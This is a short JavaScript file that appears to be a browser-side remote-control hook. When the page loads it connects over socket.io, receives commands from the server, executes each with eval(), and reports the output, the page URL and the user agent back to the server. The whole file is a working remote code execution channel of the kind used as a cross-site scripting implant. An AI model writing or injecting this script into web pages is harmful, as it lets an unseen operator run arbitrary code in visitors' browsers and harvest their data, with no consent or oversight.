import io from 'socket.io-client'

document.addEventListener('DOMContentLoaded', () => {
    const socket = io()
    const callback = ({ output, command }) => {
        socket.emit('callback', {
            command,
            location: window.location.href,
            userAgent: navigator.userAgent,
            output: output,
        })
    }

    socket.on('command', (command) => {
        try {
            const output = eval(command)
            callback({ output, command })
        } catch (e) {
            callback({ output: e.message, command })
        }
    })
})
